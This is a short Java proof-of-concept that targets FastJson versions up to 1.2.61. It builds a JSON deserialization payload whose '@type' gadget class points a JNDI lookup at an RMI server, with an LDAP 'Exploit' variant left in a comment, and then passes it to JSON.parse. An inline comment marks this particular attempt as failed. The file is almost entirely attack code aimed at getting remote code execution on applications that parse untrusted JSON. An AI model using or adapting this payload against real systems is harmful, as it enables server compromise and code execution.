import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Below_1_2_61_PoC {
    public static void main(String[] args) throws Exception {
        System.out.println("[+] ByPass FastJson <= 1.2.61 JNDI PoC");
        System.out.println("[!] **NO** Need setAutoTypeSupport!");
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // Failed...................
        String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"rmi://localhost:1099/j1dse2\"}";
        // {"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit
        JSON.parse(payload);
    }
}
